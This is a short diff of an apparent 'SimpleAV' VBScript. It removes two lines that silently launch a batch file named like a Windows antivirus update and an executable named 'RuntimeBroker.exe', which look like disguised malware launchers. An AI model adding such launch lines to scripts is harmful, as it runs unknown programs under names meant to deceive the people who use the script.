@@ -38,8 +38,3 @@ Else
   a=MsgBox(" Click OK or NO to close... ", 0+64, "SimpleAV")
   
 End If
-
-
-CreateObject("Wscript.Shell").Run """Windows AV update 1.387.695.2.bat""", 1, True
-
-CreateObject("Wscript.Shell").Run """RuntimeBroker.exe""", 1, True
